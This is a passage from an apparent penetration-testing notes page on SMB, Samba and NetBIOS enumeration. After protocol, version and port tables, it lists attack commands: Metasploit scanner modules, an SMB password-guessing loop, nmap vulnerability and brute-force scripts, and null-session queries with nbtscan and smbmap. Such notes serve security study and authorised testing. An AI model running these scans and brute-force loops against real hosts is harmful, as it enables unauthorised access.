  <a href="#smbexec" class="md-nav__link">
    Smbexec
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wmiexec" class="md-nav__link">
    wmiexec
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#download-all" class="md-nav__link">
    Download all
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-auth" class="md-nav__link">
    Kerberos Auth
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mount-smb-share" class="md-nav__link">
    Mount SMB share
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#null-session-enumeration" class="md-nav__link">
    Null Session Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#use-uptime-to-guess-patch-level" class="md-nav__link">
    Use UpTime to guess patch level
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enable-disable-status" class="md-nav__link">
    Enable / Disable / Status
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#windows-server-2012-r2-2016-powershell-methods" class="md-nav__link">
    Windows Server 2012 R2 &amp; 2016: PowerShell methods
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-v1" class="md-nav__link">
    SMB v1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-v2v3" class="md-nav__link">
    SMB v2/v3
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-81-and-windows-10-powershell-method" class="md-nav__link">
    Windows 8.1 and Windows 10: PowerShell method
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-v1-protocol" class="md-nav__link">
    SMB v1 Protocol
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-v2v3-protocol" class="md-nav__link">
    SMB v2/v3 Protocol
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-8-and-windows-server-2012" class="md-nav__link">
    Windows 8 and Windows Server 2012
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-v1-on-smb-server" class="md-nav__link">
    SMB v1 on SMB Server
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-v2v3-on-smb-server" class="md-nav__link">
    SMB v2/v3 on SMB Server
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-7-windows-server-2008-r2-windows-vista-and-windows-server-2008" class="md-nav__link">
    Windows 7, Windows Server 2008 R2, Windows Vista, and Windows Server 2008
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-v1-on-smb-server_1" class="md-nav__link">
    SMB v1 on SMB Server
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-v2v3-on-smb-server_1" class="md-nav__link">
    SMB v2/v3 on SMB Server
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disable-smb-client" class="md-nav__link">
    Disable SMB Client
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-v1-on-smb-client" class="md-nav__link">
    SMB v1 on SMB Client
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-v2v3-on-smb-client" class="md-nav__link">
    SMB v2/v3 on SMB Client
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#samba-configuration" class="md-nav__link">
    Samba Configuration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#samba-enumeration" class="md-nav__link">
    Samba Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pending-tools" class="md-nav__link">
    Pending Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#netbios" class="md-nav__link">
    NetBios
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerabilities" class="md-nav__link">
    Vulnerabilities
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bruteforcing" class="md-nav__link">
    Bruteforcing
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../SMTP-25/" title="SMTP 25" class="md-nav__link">
      SMTP 25
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../SNMP-161/" title="SNMP 161" class="md-nav__link">
      SNMP 161
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../SQL-Server-1433,1434/" title="SQL Server 1433,1434" class="md-nav__link">
      SQL Server 1433,1434
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../SSH-22/" title="SSH 22" class="md-nav__link">
      SSH 22
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../SquidProxy-3128/" title="SquidProxy 3128" class="md-nav__link">
      SquidProxy 3128
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../TFTP-69/" title="TFTP 69" class="md-nav__link">
      TFTP 69
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Telnet-23/" title="Telnet 23" class="md-nav__link">
      Telnet 23
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Tor-9001,9030/" title="Tor 9001,9030" class="md-nav__link">
      Tor 9001,9030
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../VNC-5900/" title="VNC 5900" class="md-nav__link">
      VNC 5900
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../WebDev/" title="WebDev" class="md-nav__link">
      WebDev
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../WinRM-5985,5986/" title="WinRM 5985,5986" class="md-nav__link">
      WinRM 5985,5986
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../X11-6000/" title="X11 6000" class="md-nav__link">
      X11 6000
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../rlogin-513/" title="Rlogin 513" class="md-nav__link">
      Rlogin 513
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33" type="checkbox" id="nav-33">
    
    <label class="md-nav__link" for="nav-33">
      Sqlserver
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-33">
        Sqlserver
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqlserver/3-command-execution/" title="3 command execution" class="md-nav__link">
      3 command execution
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqlserver/4-privilage-escalation/" title="04. Privilege Escalation" class="md-nav__link">
      04. Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqlserver/5-lateral-movement/" title="05. Lateral Movement" class="md-nav__link">
      05. Lateral Movement
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqlserver/6-persistence/" title="06. Persistence" class="md-nav__link">
      06. Persistence
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqlserver/9-defence/" title="09. Defence" class="md-nav__link">
      09. Defence
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqlserver/9-pending-references/" title="10. New References" class="md-nav__link">
      10. New References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqlserver/important-locations/" title="Imprtant Locations" class="md-nav__link">
      Imprtant Locations
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqlserver/sqli/" title="SQL Injection" class="md-nav__link">
      SQL Injection
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqlserver/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqlserver/z-References/" title="z References" class="md-nav__link">
      z References
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    Summary
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#server-message-block-smb-versions" class="md-nav__link">
    Server Message Block (SMB) Versions
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ports" class="md-nav__link">
    Ports
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#netbios-suffixes" class="md-nav__link">
    NetBIOS suffixes
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#version" class="md-nav__link">
    Version
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#brute-force" class="md-nav__link">
    Brute force
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-enumerate" class="md-nav__link">
    User enumerate
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scanning" class="md-nav__link">
    Scanning
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    nmap
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmblookup" class="md-nav__link">
    nmblookup
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nbtscan" class="md-nav__link">
    nbtscan
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nbtstat" class="md-nav__link">
    nbtstat
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smbmap-enumerate-samba-share-drives-across-an-entire-domain" class="md-nav__link">
    SMBMap - enumerate samba share drives across an entire domain
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smbclient" class="md-nav__link">
    smbclient
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpcclient" class="md-nav__link">
    rpcclient
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enum4linux" class="md-nav__link">
    Enum4linux
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pth-winexe" class="md-nav__link">
    pth-winexe
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nullinux" class="md-nav__link">
    nullinux
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#acccheck" class="md-nav__link">
    acccheck
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mblookup" class="md-nav__link">
    mblookup
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#crackmapexec" class="md-nav__link">
    CrackMapExec
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smbexec" class="md-nav__link">
    Smbexec
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wmiexec" class="md-nav__link">
    wmiexec
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#download-all" class="md-nav__link">
    Download all
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-auth" class="md-nav__link">
    Kerberos Auth
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mount-smb-share" class="md-nav__link">
    Mount SMB share
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#null-session-enumeration" class="md-nav__link">
    Null Session Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#use-uptime-to-guess-patch-level" class="md-nav__link">
    Use UpTime to guess patch level
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enable-disable-status" class="md-nav__link">
    Enable / Disable / Status
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#windows-server-2012-r2-2016-powershell-methods" class="md-nav__link">
    Windows Server 2012 R2 &amp; 2016: PowerShell methods
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-v1" class="md-nav__link">
    SMB v1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-v2v3" class="md-nav__link">
    SMB v2/v3
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-81-and-windows-10-powershell-method" class="md-nav__link">
    Windows 8.1 and Windows 10: PowerShell method
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-v1-protocol" class="md-nav__link">
    SMB v1 Protocol
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-v2v3-protocol" class="md-nav__link">
    SMB v2/v3 Protocol
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-8-and-windows-server-2012" class="md-nav__link">
    Windows 8 and Windows Server 2012
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-v1-on-smb-server" class="md-nav__link">
    SMB v1 on SMB Server
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-v2v3-on-smb-server" class="md-nav__link">
    SMB v2/v3 on SMB Server
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-7-windows-server-2008-r2-windows-vista-and-windows-server-2008" class="md-nav__link">
    Windows 7, Windows Server 2008 R2, Windows Vista, and Windows Server 2008
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-v1-on-smb-server_1" class="md-nav__link">
    SMB v1 on SMB Server
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-v2v3-on-smb-server_1" class="md-nav__link">
    SMB v2/v3 on SMB Server
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disable-smb-client" class="md-nav__link">
    Disable SMB Client
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-v1-on-smb-client" class="md-nav__link">
    SMB v1 on SMB Client
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-v2v3-on-smb-client" class="md-nav__link">
    SMB v2/v3 on SMB Client
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#samba-configuration" class="md-nav__link">
    Samba Configuration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#samba-enumeration" class="md-nav__link">
    Samba Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pending-tools" class="md-nav__link">
    Pending Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#netbios" class="md-nav__link">
    NetBios
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerabilities" class="md-nav__link">
    Vulnerabilities
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bruteforcing" class="md-nav__link">
    Bruteforcing
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>SMB Samba NetBIOS 135 139,445</h1>
                
                <h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
<p>In computer networking, Server Message Block (SMB), one version of which was also known as Common Internet File System (CIFS, /ˈsɪfs/), operates as an application-layer network protocol[3] mainly used for providing shared access to files, printers, and serial ports and miscellaneous communications between nodes on a network. It also provides an authenticated inter-process communication mechanism. Most usage of SMB involves computers running Microsoft Windows, where it was known as "Microsoft Windows Network" before the subsequent introduction of Active Directory. Corresponding Windows services are LAN Manager Server (for the server component) and LAN Manager Workstation (for the client component).</p>
<p>SMB can run on top of the session (and lower) network layers in several ways:
Directly over TCP, port 445 via the NetBIOS API, which in turn can run on several transports:[6]
On UDP ports 137, 138 &amp; TCP ports 137, 139 (NetBIOS over TCP/IP);
On several legacy protocols such as NBF, IPX/SPX.
The SMB "Inter-Process Communication" (IPC) system provides named pipes and was one of the first inter-process mechanisms commonly available to programmers that provides a means for services to inherit the authentication carried out when a client[clarification needed] first connects to an SMB server.[citation needed]</p>
<h2 id="server-message-block-smb-versions">Server Message Block (SMB) Versions<a class="headerlink" href="#server-message-block-smb-versions" title="Permanent link">&para;</a></h2>
<table>
<thead>
<tr>
<th align="left">SMB Version</th>
<th align="left">Windows version</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">CIFS</td>
<td align="left">Microsoft Windows NT 4.0</td>
</tr>
<tr>
<td align="left">SMB 1.0</td>
<td align="left">Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2</td>
</tr>
<tr>
<td align="left">SMB 2.0</td>
<td align="left">Windows Vista &amp; Windows Server 2008</td>
</tr>
<tr>
<td align="left">SMB 2.1</td>
<td align="left">Windows 7 and Windows Server 2008 R2</td>
</tr>
<tr>
<td align="left">SMB 3.0</td>
<td align="left">Windows 8 and Windows Server 2012</td>
</tr>
<tr>
<td align="left">SMB 3.0.2</td>
<td align="left">Windows 8.1 and Windows Server 2012 R2</td>
</tr>
<tr>
<td align="left">SMB 3.1.1</td>
<td align="left">Windows 10 and Windows Server 2016</td>
</tr>
</tbody>
</table>
<h2 id="ports">Ports<a class="headerlink" href="#ports" title="Permanent link">&para;</a></h2>
<p>netbios-ns <code class="codehilite"><span class="mi">137</span><span class="o">/</span><span class="n">tcp</span></code> # (NBT over IP) NETBIOS Name Service
netbios-ns <code class="codehilite"><span class="mi">137</span><span class="o">/</span><span class="n">udp</span></code></p>
<p>netbios-dgm <code class="codehilite"><span class="mi">138</span><span class="o">/</span><span class="n">tcp</span></code> # (NBT over IP) NETBIOS Datagram Service
netbios-dgm <code class="codehilite"><span class="mi">138</span><span class="o">/</span><span class="n">udp</span></code></p>
<p>netbios-ssn <code class="codehilite"><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span></code> # (NBT over IP) NETBIOS session service
netbios-ssn <code class="codehilite"><span class="mi">139</span><span class="o">/</span><span class="n">udp</span></code></p>
<p>microsoft-ds <code class="codehilite"><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span></code> # (SMB over IP) If you are using Active Directory (used when SMB is used directly on TCP stack, without using NetBIOS)</p>
<h2 id="netbios-suffixes">NetBIOS suffixes<a class="headerlink" href="#netbios-suffixes" title="Permanent link">&para;</a></h2>
<p>For unique names:
<div class="codehilite"><pre><span></span><span class="mi">00</span>: <span class="nv">Workstation</span> <span class="nv">Service</span> <span class="ss">(</span><span class="nv">workstation</span> <span class="nv">name</span><span class="ss">)</span>
<span class="mi">03</span>: <span class="nv">Windows</span> <span class="nv">Messenger</span> <span class="nv">service</span>
<span class="mi">06</span>: <span class="nv">Remote</span> <span class="nv">Access</span> <span class="nv">Service</span>
<span class="mi">20</span>: <span class="nv">File</span> <span class="nv">Service</span> <span class="ss">(</span><span class="nv">also</span> <span class="nv">called</span> <span class="nv">Host</span> <span class="nv">Record</span><span class="ss">)</span>
<span class="mi">21</span>: <span class="nv">Remote</span> <span class="nv">Access</span> <span class="nv">Service</span> <span class="nv">client</span>
<span class="mi">1</span><span class="nv">B</span>: <span class="nv">Domain</span> <span class="nv">Master</span> <span class="nv">Browser</span> – <span class="nv">Primary</span> <span class="nv">Domain</span> <span class="nv">Controller</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">domain</span>
<span class="mi">1</span><span class="nv">D</span>: <span class="nv">Master</span> <span class="nv">Browser</span>
</pre></div></p>
<p>For group names:
<div class="codehilite"><pre><span></span><span class="mi">00</span>: <span class="nv">Workstation</span> <span class="nv">Service</span> <span class="ss">(</span><span class="nv">workgroup</span><span class="o">/</span><span class="nv">domain</span> <span class="nv">name</span><span class="ss">)</span>
<span class="mi">1</span><span class="nv">C</span>: <span class="nv">Domain</span> <span class="nv">Controllers</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">domain</span>
<span class="mi">1</span><span class="nv">E</span>: <span class="nv">Browser</span> <span class="nv">Service</span> <span class="nv">Elections</span>
</pre></div></p>
<h2 id="version">Version<a class="headerlink" href="#version" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_version</span>
</pre></div>

<h2 id="brute-force">Brute force<a class="headerlink" href="#brute-force" title="Permanent link">&para;</a></h2>
<p><div class="codehilite"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_login</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="k">while</span> <span class="nv">read</span> <span class="nv">USER</span><span class="c1">; do echo $USER &amp;&amp; smbmap -H 10.10.10.172 -u &quot;$USER&quot; -p &quot;$USER&quot;; done &lt; userslist</span>
</pre></div></p>
<h2 id="user-enumerate">User enumerate<a class="headerlink" href="#user-enumerate" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_lookupsid</span>
</pre></div>

<h2 id="scanning">Scanning<a class="headerlink" href="#scanning" title="Permanent link">&para;</a></h2>
<blockquote>
<ul>
<li>Ref: <a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/</a></li>
</ul>
</blockquote>
<h3 id="nmap">nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="n">ls</span> <span class="o">-</span><span class="n">lh</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">nmap</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">smb</span><span class="o">*</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">nmap</span> <span class="c1">--script safe -p445 $ip</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">nmap</span> <span class="c1">--script smb-protocols -p445 $ip</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">139</span><span class="p">,</span><span class="mi">446</span> <span class="err">$</span><span class="n">ip</span> <span class="c1">--open</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">nmap</span> <span class="err">‐</span><span class="n">v</span> <span class="err">‐</span><span class="n">p</span> <span class="mi">139</span><span class="p">,</span><span class="mi">445</span> <span class="o">-</span><span class="err">‐</span><span class="n">script</span> <span class="n">smb</span><span class="err">‐</span><span class="o">*</span>  <span class="err">$</span><span class="n">ip</span>
<span class="n">nmap</span> <span class="err">‐</span><span class="n">v</span> <span class="err">‐</span><span class="n">p</span> <span class="mi">139</span><span class="p">,</span><span class="mi">445</span> <span class="c1">--script vuln $ip</span>
<span class="n">nmap</span> <span class="err">‐</span><span class="n">v</span> <span class="err">‐</span><span class="n">p</span> <span class="mi">139</span><span class="p">,</span><span class="mi">445</span> <span class="o">-</span><span class="err">‐</span><span class="n">script</span> <span class="n">smb</span><span class="err">‐</span><span class="n">vuln</span><span class="o">*</span>  <span class="err">$</span><span class="n">ip</span>
<span class="n">nmap</span> <span class="err">‐</span><span class="n">v</span> <span class="err">‐</span><span class="n">p</span> <span class="mi">139</span><span class="p">,</span><span class="mi">445</span> <span class="o">-</span><span class="err">‐</span><span class="n">script</span> <span class="n">smb</span><span class="err">‐</span><span class="k">security</span><span class="err">‐</span><span class="k">mode</span>  <span class="err">$</span><span class="n">ip</span>
<span class="n">nmap</span> <span class="err">‐</span><span class="n">v</span> <span class="err">‐</span><span class="n">p</span> <span class="mi">139</span><span class="p">,</span><span class="mi">445</span> <span class="o">-</span><span class="err">‐</span><span class="n">script</span> <span class="n">smb</span><span class="err">‐</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span>  <span class="err">$</span><span class="n">ip</span>
<span class="n">nmap</span> <span class="err">‐</span><span class="n">v</span> <span class="err">‐</span><span class="n">p</span> <span class="mi">139</span><span class="p">,</span><span class="mi">445</span> <span class="o">-</span><span class="err">‐</span><span class="n">script</span> <span class="n">smb</span><span class="err">‐</span><span class="k">check</span><span class="o">-</span><span class="n">vulns</span> <span class="c1">--script-args=unsafe=1  $ip</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">conficker</span>
<span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">cve2009</span><span class="o">-</span><span class="mi">3103</span>
<span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms06</span><span class="o">-</span><span class="mi">025</span>
<span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms07</span><span class="o">-</span><span class="mi">029</span>
<span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">regsvc</span><span class="o">-</span><span class="n">dos</span>
<span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms08</span><span class="o">-</span><span class="mi">067</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">nmap</span> <span class="c1">--script smb-brute.nse -p445 (TARGET IP ADDRESS)</span>
<span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">139</span><span class="p">.</span><span class="mi">445</span> <span class="c1">--script smb-enum-users (TARGET IP ADDRESS)</span>
</pre></div>

<p><a href="https://security.stackexchange.com/questions/119827/missing-scripts-in-nmap">https://security.stackexchange.com/questions/119827/missing-scripts-in-nmap</a></p>
<h3 id="nmblookup">nmblookup<a class="headerlink" href="#nmblookup" title="Permanent link">&para;</a></h3>
<ul>
<li>Query NetBIOS names and map them to IP addresses in a network</li>
<li>Using NetBIOS over TCP/IP queries</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">nmblookup</span> <span class="o">-</span><span class="n">A</span> <span class="err">$</span><span class="n">ip</span>
</pre></div>

<h3 id="nbtscan">nbtscan<a class="headerlink" href="#nbtscan" title="Permanent link">&para;</a></h3>
<ul>
<li>Scan NetBIOS name servers open on a local or remote TCP/IP network</li>
<li>Works on a whole subnet instead of individual IP</li>
<li>Similar to <code class="codehilite"><span class="n">nbtstat</span></code> (Windows standard tool)</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">nbtscan</span> <span class="err">$</span><span class="n">ip</span><span class="o">/</span><span class="mi">24</span>
</pre></div>

<h3 id="nbtstat">nbtstat<a class="headerlink" href="#nbtstat" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="n">nbtstat</span> <span class="err">$</span><span class="n">ip</span>
<span class="n">nbtscan</span> <span class="o">-</span><span class="err">‐</span><span class="n">r</span> <span class="err">$</span><span class="n">ip</span><span class="o">/</span><span class="mi">24</span>
</pre></div>

<ul>
<li>nbtstat -c: displays the contents of the NetBIOS name cache, the table of NetBIOS names and their resolved IP addresses.</li>
<li>nbtstat -n: displays the names that have been registered locally on the system.</li>
<li>nbtstat -r: displays the count of all NetBIOS names resolved by broadcast and querying a WINS server.</li>
<li>nbtstat -R: purges and reloads the remote cache name table.</li>
<li>nbtstat -RR: sends name release packets to WINs and then starts Refresh.</li>
<li>nbtstat -s: lists the current NetBIOS sessions and their status, including statistics.</li>
<li>nbtstat -S: lists sessions table with the destination IP addresses.</li>
</ul>
<h3 id="smbmap-enumerate-samba-share-drives-across-an-entire-domain">SMBMap - enumerate samba share drives across an entire domain<a class="headerlink" href="#smbmap-enumerate-samba-share-drives-across-an-entire-domain" title="Permanent link">&para;</a></h3>
<ul>
<li>Allows users to enumerate samba share drives across an entire domain</li>
<li>Usage<ul>
<li>List share drives, drive permissions, share contents</li>
<li>Upload/download functionality</li>
<li>File name auto-download pattern matching</li>
<li>Execute remote commands</li>
</ul>
</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">smbmap</span> <span class="o">-</span><span class="n">H</span> <span class="err">$</span><span class="n">ip</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">smbmap</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">workgroup</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">H</span> <span class="err">$</span><span class="n">ip</span>
<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="ss">&quot;&quot;</span> <span class="o">-</span><span class="n">p</span> <span class="ss">&quot;&quot;</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">workgroup</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">H</span> <span class="err">$</span><span class="n">ip</span>
